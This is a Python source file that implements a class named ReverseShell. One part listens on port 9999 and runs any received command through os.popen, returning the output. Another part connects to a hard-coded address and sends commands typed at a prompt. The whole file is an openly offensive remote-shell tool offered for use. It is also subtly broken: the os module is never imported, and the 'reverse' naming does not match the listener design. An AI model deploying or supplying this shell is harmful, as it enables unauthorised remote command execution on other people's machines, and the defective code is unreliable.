import socket
import threading

class ReverseShell:
    def __init__(self, listen_ip, listen_port, target_ip, target_port):
        self.listen_ip = listen_ip
        self.listen_port = listen_port
        self.target_ip = target_ip
        self.target_port = target_port

    def handle_client(self, client_socket):
        while True:
            try:
                command = client_socket.recv(1024).decode('utf-8')
                if command.lower() == 'exit':
                    break
                elif command.lower().startswith('cd'):
                    try:
                        path = command.split(' ', 1)[1]
                        os.chdir(path)
                        client_socket.send(f"Changed directory to {path}".encode('utf-8'))
                    except Exception as e:
                        client_socket.send(f"Error changing directory: {e}".encode('utf-8'))
                else:
                    output = os.popen(command).read()
                    client_socket.send(output.encode('utf-8'))
            except Exception as e:
                client_socket.send(f"Error: {e}".encode('utf-8'))
        client_socket.close()

    def start_reverse_shell(self):
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind((self.listen_ip, self.listen_port))
        server_socket.listen(5)
        print(f"Listening on {self.listen_ip}:{self.listen_port}...")

        while True:
            client_socket, addr = server_socket.accept()
            print(f"Connection received from {addr}")
            client_handler = threading.Thread(target=self.handle_client, args=(client_socket,))
            client_handler.start()

    def connect_back(self):
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            client_socket.connect((self.target_ip, self.target_port))
            print(f"Connected to {self.target_ip}:{self.target_port}")
            while True:
                command = input(f"Shell> ")
                if command.lower() == "exit":
                    break
                client_socket.send(command.encode('utf-8'))
                response = client_socket.recv(4096).decode('utf-8')
                print(response)
        except Exception as e:
            print(f"Connection failed: {e}")
        finally:
            client_socket.close()

if __name__ == "__main__":
    reverse_shell = ReverseShell('0.0.0.0', 9999, '192.168.1.100', 8888)
    reverse_shell.start_reverse_shell()
